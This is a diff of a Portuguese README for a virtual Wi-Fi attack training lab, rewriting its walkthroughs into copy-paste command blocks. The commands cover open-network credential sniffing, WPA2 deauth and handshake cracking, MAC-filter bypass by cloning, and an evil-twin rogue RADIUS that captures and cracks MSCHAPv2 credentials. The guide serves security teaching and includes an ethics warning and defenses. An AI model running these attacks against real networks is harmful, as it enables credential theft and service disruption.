@@ -20,7 +20,7 @@ vulnerável no ar.
 
 ---
 
-Instalação rápida (setup)
+## Instalação rápida (setup)
 
 No Kali, como root, rode o setup da XPSec Academy — ele baixa e prepara o lab:
 
@@ -32,11 +32,17 @@ curl -fsSL https://raw.githubusercontent.com/XPSec-Security/wifilab/refs/heads/m
 
 ## Uso
 
+O atalho acima sobe o lab, mas não deixa o script salvo. Para usar `--status` e
+`--down`, baixe o script uma vez:
+
 ```bash
-sudo ./xpsec-wifi-lab-pro.sh --up            # instala deps + sobe o lab completo
-sudo ./xpsec-wifi-lab-pro.sh --install       # só instala as dependências
-sudo ./xpsec-wifi-lab-pro.sh --status        # mostra o que está no ar
-sudo ./xpsec-wifi-lab-pro.sh --down          # destrói tudo
+curl -fsSLO https://raw.githubusercontent.com/XPSec-Security/wifilab/refs/heads/main/wifilab-setup-academy.sh
+chmod +x wifilab-setup-academy.sh
+
+sudo ./wifilab-setup-academy.sh --up          # instala deps + sobe o lab completo
+sudo ./wifilab-setup-academy.sh --install     # só instala as dependências
+sudo ./wifilab-setup-academy.sh --status      # mostra o que está no ar
+sudo ./wifilab-setup-academy.sh --down        # destrói tudo
 ```
 
 ---
@@ -77,28 +83,61 @@ Guia prático de ataque para cada rede do lab. **Todos os passos são manuais** 
 lab apenas sobe os alvos; a exploração é sua. Os comandos assumem a interface de
 monitor `mon_lab` e a interface de ataque `atk0`, ambas criadas pelo `--up`.
 
+Os blocos de comando estão **prontos para copiar e colar**: a seção 0 descobre os
+BSSIDs e os MACs dos clientes e os salva em `/tmp/lab.env`, e as demais seções
+usam essas variáveis (`$BSSID_CORP`, `$STA_WPA2_MAC`...). Nada precisa ser
+digitado à mão.
+
 > Ética: isto só é legal porque é um lab fechado, virtual e seu. Rodar qualquer um
 > destes ataques contra redes de terceiros é crime.
 
-## 0. Preparação — modo monitor
+## 0. Preparação — modo monitor e reconhecimento
 
 Coloque a interface livre em modo monitor (captura todos os quadros 802.11 do ar,
-não só os destinados a você) e faça uma varredura geral para enxergar os BSSIDs.
+não só os destinados a você) e faça uma varredura de 40 s em 2.4 + 5 GHz. A
+varredura grava um CSV; o passo 3 lê esse CSV e salva os alvos em `/tmp/lab.env`.
 
 ```bash
-# derruba, troca p/ monitor, sobe de novo
+# 1) modo monitor: derruba, troca o tipo e sobe de novo
 sudo ip link set mon_lab down
 sudo iw dev mon_lab set type monitor
 sudo ip link set mon_lab up
 
-# varredura 2.4 + 5 GHz: anote os BSSIDs (coluna 1) e canais (coluna CH)
-sudo airodump-ng --band abg mon_lab
+# 2) varredura 2.4 + 5 GHz por 40 s (a tela fecha sozinha) -> /tmp/recon-01.csv
+sudo rm -f /tmp/recon-*
+sudo timeout -s INT 40 airodump-ng --band abg -w /tmp/recon --output-format csv mon_lab
+
+# 3) extrai do CSV os BSSIDs (pelo SSID) e os clientes (pelo BSSID) -> /tmp/lab.env
+csv=/tmp/recon-01.csv
+ap()  { awk -F', *' -v s="$1" '$14==s {print $1; exit}' "$csv"; }
+sta() { awk -F', *' -v b="$1" '/^Station MAC/{st=1; next} st && $6==b {print $1; exit}' "$csv"; }
+cat > /tmp/lab.env <<EOF
+BSSID_OPEN=$(ap XPSEC-OPEN)
+BSSID_WPA2=$(ap XPSEC-WPA2)
+BSSID_MACACL=$(ap XPSEC-MACACL)
+BSSID_CORP=$(ap XPSEC-CORP)
+STA_WPA2_MAC=$(sta "$(ap XPSEC-WPA2)")
+STA_MACACL_MAC=$(sta "$(ap XPSEC-MACACL)")
+EOF
+cat /tmp/lab.env
 ```
+
+> **Confira a saída do `cat`:** nenhuma linha pode ficar vazia depois do `=`. Se
+> ficar, repita os passos 2 e 3 (um cliente só aparece quando transmite enquanto o
+> airodump passa pelo canal dele). Em último caso, preencha à mão com o valor que
+> aparece no airodump.
+>
+> **Em todo terminal novo**, carregue as variáveis antes de seguir:
+> `source /tmp/lab.env`
+
+Para só olhar o ar ao vivo: `sudo airodump-ng --band abg mon_lab` (Ctrl+C sai).
 
 | Comando | O que faz |
 |---|---|
 | `iw dev mon_lab set type monitor` | Põe o rádio em modo monitor (promíscuo de RF). |
-| `airodump-ng --band abg` | Escaneia 2.4 GHz (b/g) e 5 GHz (a), listando APs e clientes. |
+| `timeout -s INT 40 airodump-ng --band abg ... --output-format csv` | Escaneia 2.4 GHz (b/g) e 5 GHz (a) por 40 s e grava APs e clientes em CSV. |
+| `ap XPSEC-CORP` / `sta <BSSID>` | Leem o CSV: BSSID de um SSID (coluna 14) / cliente associado a um BSSID (coluna 6 da tabela de clientes). |
+| `source /tmp/lab.env` | Carrega as variáveis no terminal atual. |
 
 ---
 
@@ -109,22 +148,34 @@ intranet a cada poucos segundos. Como não há cifra, o POST com usuário/senha
 trafega legível — basta capturar e ler.
 
 ```bash
-# 1) captura o tráfego do AP aberto num arquivo .cap
-sudo airodump-ng -c 3 --bssid <BSSID_OPEN> -w /tmp/open mon_lab
+source /tmp/lab.env
 
-# 2) abra a captura e filtre o POST de login
-wireshark /tmp/open-01.cap       # filtro de display:  http.request.method == "POST"
-#   (sem GUI? use tshark)
+# 1) grava 30 s do tráfego do AP aberto (o bot faz login nesse intervalo)
+sudo rm -f /tmp/open-*
+sudo timeout -s INT 30 airodump-ng -c 3 --bssid "$BSSID_OPEN" -w /tmp/open mon_lab
+
+# 2) extrai o corpo do POST de login, sem abrir GUI
 tshark -r /tmp/open-01.cap -Y 'http.request.method=="POST"' -T fields -e http.file_data
-# Captura direta
+#   user=funcionario&pass=Intranet@2026
+```
+
+Alternativas:
+
+```bash
+# Wireshark (GUI): abra a captura e use o filtro  http.request.method == "POST"
+wireshark /tmp/open-01.cap
+
+# captura direta na mon_lab, sem arquivo (Ctrl+C para parar)
+sudo iw dev mon_lab set channel 3
 sudo tshark -i mon_lab -f 'type data' -Y 'http.request.method=="POST"' -T fields -e http.file_data
 ```
 
 | Comando | O que faz |
 |---|---|
-| `airodump-ng -c 3 --bssid ... -w /tmp/open` | Trava no canal 3 e grava só o tráfego daquele AP em `/tmp/open-01.cap`. |
+| `rm -f /tmp/open-*` | Apaga capturas antigas: o airodump nunca sobrescreve, criaria `open-02.cap` e o `tshark` leria a velha. |
+| `timeout -s INT 30 airodump-ng -c 3 --bssid ... -w /tmp/open` | Trava no canal 3 e grava 30 s do tráfego daquele AP em `/tmp/open-01.cap`. |
 | filtro `http.request.method == "POST"` | Isola o envio do formulário de login. |
-| `tshark ... -e http.file_data` | Extrai o corpo do POST (`user=funcionario&pass=Intranet@2026`) sem abrir GUI. |
+| `tshark ... -e http.file_data` | Extrai o corpo do POST (`user=funcionario&pass=Intranet@2026`). |
 
 **Resultado:** `funcionario` / `Intranet@2026`.
 **Defesa:** nunca trafegar credenciais sem TLS; rede aberta exige portal + HTTPS.
@@ -140,29 +191,38 @@ O lab mantém o cliente `sta_wpa2` **sempre associado e gerando tráfego** (fica
 visível como STATION no canal 11 em segundos). Após o deauth ele reconecta
 sozinho em ~5s (watchdog), refazendo o 4-way — então a captura é repetível.
 
+**Terminal 1**: grave o canal 11 e deixe rodando.
+
 ```bash
-# 1) capture o handshake (deixe rodando) e anote o BSSID e o MAC do STATION
-sudo airodump-ng -c 11 --bssid <BSSID_WPA2> -w /tmp/wpa2 mon_lab
+source /tmp/lab.env
+sudo rm -f /tmp/wpa2-*
+sudo airodump-ng -c 11 --bssid "$BSSID_WPA2" -w /tmp/wpa2 mon_lab
+```
 
-# 2) derrube o cliente para forçar a reconexão (e o novo handshake).
-#    Direcionar ao MAC do cliente (-c) é mais confiável que broadcast no hwsim.
-sudo aireplay-ng -0 5 -a <BSSID_WPA2> -c <STA_WPA2_MAC> mon_lab
-#   quando o airodump mostrar "WPA handshake: <BSSID>" no topo, pode parar
+**Terminal 2**: derrube o cliente e quebre o handshake.
 
-# 3) monte uma wordlist e quebre offline
+```bash
+source /tmp/lab.env
+
+# 1) deauth direcionado ao cliente (-c), mais confiável que broadcast no hwsim
+sudo aireplay-ng -0 5 -a "$BSSID_WPA2" -c "$STA_WPA2_MAC" mon_lab
+#   quando o Terminal 1 mostrar "WPA handshake: <BSSID>" no topo, pare o airodump (Ctrl+C)
+
+# 2) monte uma wordlist e quebre offline
 printf '123456\nverao2024\nadmin123\n' > /tmp/wl.txt
-aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap
+aircrack-ng -w /tmp/wl.txt -b "$BSSID_WPA2" /tmp/wpa2-01.cap
+#   KEY FOUND! [ verao2024 ]
 ```
 
 | Comando | O que faz |
 |---|---|
 | `airodump-ng -c 11 --bssid ... -w /tmp/wpa2` | Grava os quadros do AP, incluindo o handshake EAPOL. |
 | `aireplay-ng -0 5 -a <BSSID> -c <STA_MAC>` | Envia 5 deauth ao cliente alvo → ele reconecta e refaz o handshake. |
-| `aircrack-ng -w wl.txt cap` | Testa cada senha da wordlist contra o handshake (crack offline). |
+| `aircrack-ng -w wl.txt -b <BSSID> cap` | Testa cada senha da wordlist contra o handshake (crack offline). |
 
-> **Dica:** o `<STA_WPA2_MAC>` é o MAC que aparece na coluna STATION do airodump
-> associado ao `<BSSID_WPA2>`. Se o handshake não aparecer, confirme que o
-> airodump está **fixo no canal 11** (`-c 11`) e repita o deauth.
+> **Dica:** se o handshake não aparecer, confirme que o airodump está **fixo no
+> canal 11** (`-c 11`) e repita o `aireplay-ng`. Se `$STA_WPA2_MAC` estiver vazio,
+> refaça a varredura da seção 0.
 
 **Resultado:** senha `verao2024`.
 **Defesa:** senha longa e aleatória (o 4-way handshake é inquebrável por força
@@ -234,25 +294,36 @@ Rede aberta "protegida" por lista branca de MAC. O MAC autorizado trafega em
 claro no ar; basta descobri-lo e **cloná-lo** — filtro de MAC não é segurança.
 
 ```bash
-# 1) veja o STATION autorizado (coluna STATION do airodump) associado ao AP
-sudo airodump-ng -c 9 --bssid <BSSID_MACACL> mon_lab
-#   anote o MAC do cliente autorizado (no lab: 02:ca:fe:00:11:22)
+source /tmp/lab.env
+echo "$STA_MACACL_MAC"        # MAC do cliente autorizado, visto no ar (no lab: 02:CA:FE:00:11:22)
+#   (opcional) veja ao vivo: sudo airodump-ng -c 9 --bssid "$BSSID_MACACL" mon_lab
 
-# 2) (prove que o filtro funciona) tente associar com SEU MAC -> recusado
-#     agora clone o MAC autorizado na interface de ataque:
+# 1) prove que o filtro funciona: com o SEU MAC o AP recusa
 sudo ip link set atk0 down
-sudo macchanger -m 02:ca:fe:00:11:22 atk0
+sudo iw dev atk0 set type managed
+sudo ip link set atk0 up
+sudo iw dev atk0 connect XPSEC-MACACL; sleep 5; sudo iw dev atk0 link
+#   Not connected.
+sudo iw dev atk0 disconnect 2>/dev/null
+
+# 2) clone o MAC autorizado na interface de ataque
+sudo ip link set atk0 down
+sudo macchanger -m "$STA_MACACL_MAC" atk0
 sudo ip link set atk0 up
 
-# 3) associe-se à rede aberta com o MAC clonado -> filtro furado
-sudo iw dev atk0 connect XPSEC-MACACL
+# 3) associe-se de novo com o MAC clonado -> filtro furado
+sudo iw dev atk0 connect XPSEC-MACACL; sleep 5; sudo iw dev atk0 link
+#   Connected to <BSSID_MACACL> ... SSID: XPSEC-MACACL
 ```
+
+Para voltar ao MAC original depois:
+`sudo iw dev atk0 disconnect; sudo ip link set atk0 down; sudo macchanger -p atk0; sudo ip link set atk0 up`
 
 | Comando | O que faz |
 |---|---|
-| `airodump-ng -c 9 --bssid ...` | Mostra o MAC do cliente que o AP aceita (viaja em claro). |
-| `macchanger -m 02:ca:fe:00:11:22 atk0` | Troca o MAC da sua interface para o autorizado (clonagem). |
-| `iw dev atk0 connect XPSEC-MACACL` | Conecta na rede aberta já com o MAC permitido. |
+| `echo "$STA_MACACL_MAC"` | MAC do cliente que o AP aceita, capturado na varredura (viaja em claro). |
+| `iw dev atk0 connect XPSEC-MACACL` + `iw dev atk0 link` | Tenta associar e mostra o resultado (`Not connected.` = recusado). |
+| `macchanger -m <MAC> atk0` | Troca o MAC da sua interface para o autorizado (clonagem). |
 
 **Resultado:** acesso à rede apesar do filtro.
 **Defesa:** filtro de MAC é só cosmético; use autenticação real (WPA2/Enterprise).
@@ -268,10 +339,12 @@ credenciais você precisa montar um **evil twin** (RADIUS falso) que capture o
 desafio/resposta MSCHAPv2 e, antes, **clonar o certificado** do RADIUS real para
 que o rogue pareça idêntico.
 
-### 5.1 Recon — ache o BSSID do CORP legítimo (canal 149)
+### 5.1 Recon — o BSSID do CORP legítimo (canal 149)
 
 ```bash
-sudo airodump-ng -c 149 --band a mon_lab     # anote o <BSSID_CORP>
+source /tmp/lab.env
+echo "$BSSID_CORP"            # BSSID do CORP legítimo (descoberto na seção 0)
+#   (opcional) veja o AP e a vítima ao vivo: sudo airodump-ng -c 149 --bssid "$BSSID_CORP" mon_lab
 ```
 
 ### 5.2 (Opcional, realista) Extraia o certificado do RADIUS do ar
@@ -279,20 +352,71 @@ sudo airodump-ng -c 149 --band a mon_lab     # anote o <BSSID_CORP>
 No PEAP, o certificado do servidor viaja **em claro**, antes do túnel TLS. Dá para
 capturá-lo e ler o `subject`/`CN` que você vai clonar.
 
+Mas ele só vai ao ar **durante uma autenticação EAP**. Só gravar com o airodump
+não basta: a vítima autenticou quando o lab subiu, antes da sua captura. Um
+deauth nem sempre resolve, porque ao reconectar no mesmo AP ela pode usar o cache
+de PMKSA e pular o EAP.
+
+O jeito confiável é **você mesmo** iniciar um PEAP contra o AP legítimo, com
+credenciais falsas: o RADIUS envia o certificado para qualquer cliente **antes**
+de checar usuário e senha.
+
+**Terminal 1**: grave o canal do CORP e deixe rodando.
+
 ```bash
-sudo airodump-ng -c 149 --bssid <BSSID_CORP> -w /tmp/corp mon_lab
-# Wireshark /tmp/corp-01.cap  ->  filtro:  tls.handshake.type == 11
-#   (Certificate) -> botão direito no cert -> Export Packet Bytes -> cert.der
-openssl x509 -inform DER -in cert.der -out /tmp/legit.pem      # se vier em DER
-openssl x509 -in /tmp/legit.pem -noout -subject -nameopt RFC2253
-#   ex.: subject=CN=radius.xpsec.local,O=XPSec Corp
+source /tmp/lab.env
+sudo rm -f /tmp/corp-*        # sem isso, uma 2ª captura viraria corp-02.cap e o tshark leria a velha
+sudo airodump-ng -c 149 --bssid "$BSSID_CORP" -w /tmp/corp mon_lab
 ```
+
+**Terminal 2**: autentique o `atk0` com uma identidade falsa.
+
+```bash
+# libere o atk0: pare o hostapd-wpe se já estiver rodando (Ctrl+C) e, se fez a
+# seção 4, desconecte do MACACL
+sudo iw dev atk0 disconnect 2>/dev/null
+sudo ip link set atk0 down
+sudo iw dev atk0 set type managed
+sudo ip link set atk0 up
+sudo iw dev atk0 scan | grep 'SSID: XPSEC-CORP'     # confirme que enxerga o CORP
+
+cat > /tmp/probe_corp.conf <<'EOF'
+network={
+    ssid="XPSEC-CORP"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="anonymous"
+    password="qualquer"
+    phase2="auth=MSCHAPV2"
+}
+EOF
+
+sudo wpa_supplicant -D nl80211 -i atk0 -c /tmp/probe_corp.conf
+#   atk0: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/O=XPSec Corp/CN=radius.xpsec.local' ...
+#   atk0: CTRL-EVENT-EAP-FAILURE EAP authentication failed   <- esperado (senha falsa)
+#   Ctrl+C assim que aparecer o FAILURE
+```
+
+Pare o airodump no Terminal 1 (Ctrl+C) e extraia o certificado do `.cap` com o
+`tshark`:
+
+```bash
+tshark -r /tmp/corp-01.cap -Y 'tls.handshake.type == 11' \
+  -T fields -e tls.handshake.certificate | head -1 | cut -d, -f1 | xxd -r -p > /tmp/legit.der
+openssl x509 -inform DER -in /tmp/legit.der -noout -subject -issuer -nameopt RFC2253
+#   subject=CN=radius.xpsec.local,O=XPSec Corp
+#   issuer=CN=XPSec Corp Root CA,O=XPSec Corp
+```
+
+Se o filtro não trouxer nada, rode o `tshark` com `-Y eap`: se também vier vazio,
+o airodump não estava gravando (canal/BSSID errado) no momento da autenticação.
 
 ### 5.3 Clone a identidade do certificado
 
 Gera um certificado self-signed **novo** com o **mesmo subject/CN** do RADIUS
-legítimo. Você não tem a chave privada original — é um *sósia*, suficiente para
-clientes que não validam a CA (ou que só olham o CN).
+legítimo (o `subject` que você leu no 5.2). Você não tem a chave privada
+original — é um *sósia*, suficiente para clientes que não validam a CA (ou que só
+olham o CN).
 
 ```bash
 openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
@@ -305,6 +429,7 @@ openssl dhparam -dsaparam -out /tmp/dh.pem 2048
 
 # confira que o sósia tem o subject certo:
 openssl x509 -in /tmp/clone.pem -noout -subject -issuer -nameopt RFC2253
+#   subject=CN=radius.xpsec.local,O=XPSec Corp
 ```
 
 ### 5.4 Suba o evil twin (rogue RADIUS) com o cert clonado
@@ -335,11 +460,16 @@ dh_file=/tmp/dh.pem
 CONF
 
 # prepare a interface de ataque e suba o rogue (fica em foreground, capturando)
+sudo iw dev atk0 disconnect 2>/dev/null
 sudo ip link set atk0 down
 sudo iw dev atk0 set type managed
 sudo ip link set atk0 up
-sudo hostapd-wpe -s /tmp/evil_corp.conf
+sudo stdbuf -oL hostapd-wpe -s /tmp/evil_corp.conf | tee /tmp/evil_corp.log
 ```
+
+O `tee` mostra a saída na tela **e** grava em `/tmp/evil_corp.log` (o 5.6 lê
+desse arquivo); o `stdbuf -oL` faz as linhas aparecerem na hora, em vez de ficarem
+presas no buffer do pipe. Deixe este terminal aberto.
 
 ### 5.5 Deauth — force a vítima a migrar do legítimo para o rogue
 
@@ -347,29 +477,44 @@ sudo hostapd-wpe -s /tmp/evil_corp.conf
 conseguir ficar no legítimo, a vítima reassocia no seu evil twin (mesmo SSID).
 
 ```bash
-sudo aireplay-ng -0 0 -a <BSSID_CORP> mon_lab
-#   -0 0 = deauth infinito; deixe rodando até a vítima cair no rogue
+source /tmp/lab.env
+sudo iw dev mon_lab set channel 149     # o aireplay injeta no canal atual da mon_lab
+sudo aireplay-ng -0 0 -a "$BSSID_CORP" mon_lab
+#   -0 0 = deauth infinito. Pare (Ctrl+C) quando o terminal do hostapd-wpe
+#   mostrar um bloco "mschapv2:" com username / challenge / response
 ```
 
 ### 5.6 Capture e crackeie o MSCHAPv2
 
-Quando a vítima faz PEAP contra o seu rogue, o `hostapd-wpe` imprime (e grava)
-usuário + challenge + response.
+Quando a vítima faz PEAP contra o seu rogue, o `hostapd-wpe` imprime usuário +
+challenge + response (e o `tee` grava em `/tmp/evil_corp.log`). Pode parar o
+`hostapd-wpe` (Ctrl+C) e quebrar offline:
 
 ```bash
-# as credenciais aparecem no terminal do hostapd-wpe; para reler do log:
-grep -i -A3 mschapv2 /tmp/evil_corp.log      # username / challenge / response
+# challenge e response da primeira captura do log
+grep -A4 'mschapv2:' /tmp/evil_corp.log | head -5          # confira o bloco capturado
+CH=$(grep -m1 'challenge:' /tmp/evil_corp.log | awk '{print $2}')
+RESP=$(grep -m1 'response:' /tmp/evil_corp.log | awk '{print $2}')
+echo "challenge=$CH"; echo "response=$RESP"
 
-# quebre offline com asleap:
-asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
-#   alternativa: hashcat -m 5500 (formato NETNTLMv1)
+# wordlist com variações do padrão corporativo + quebra com asleap
+printf 'Senha@2024\nSenha@Corp2025\nSenha@Corp123\n' > /tmp/wlc.txt
+asleap -C "$CH" -R "$RESP" -W /tmp/wlc.txt
+#   password: Senha@Corp123
 ```
+
+Numa auditoria real use uma wordlist grande. No Kali a rockyou vem compactada:
+`sudo gunzip /usr/share/wordlists/rockyou.txt.gz` e depois
+`asleap -C "$CH" -R "$RESP" -W /usr/share/wordlists/rockyou.txt`.
+Alternativa ao asleap: `hashcat -m 5500` (formato NETNTLMv1).
 
 | Comando | O que faz |
 |---|---|
+| `wpa_supplicant -i atk0 -c /tmp/probe_corp.conf` | Inicia um PEAP com credenciais falsas só para o RADIUS legítimo enviar o certificado. |
+| `tshark ... -e tls.handshake.certificate` | Extrai o certificado (DER) do `.cap` sem abrir GUI. |
 | `openssl req -x509 ... -subj "/.../CN=radius.xpsec.local"` | Gera o cert *sósia* com a identidade do RADIUS real. |
-| `hostapd-wpe -s /tmp/evil_corp.conf` | Sobe o RADIUS falso (evil twin) e captura o MSCHAPv2. |
-| `aireplay-ng -0 0 -a <BSSID_CORP>` | Deauth infinito no AP legítimo → empurra a vítima para o rogue. |
+| `stdbuf -oL hostapd-wpe -s ... \| tee /tmp/evil_corp.log` | Sobe o RADIUS falso (evil twin), captura o MSCHAPv2 e grava a saída em log. |
+| `aireplay-ng -0 0 -a "$BSSID_CORP"` | Deauth infinito no AP legítimo → empurra a vítima para o rogue. |
 | `asleap -C -R -W` | Quebra o par challenge/response para recuperar a senha. |
 
 **Resultado:** `funcionario@xpsec.local` / `Senha@Corp123`.
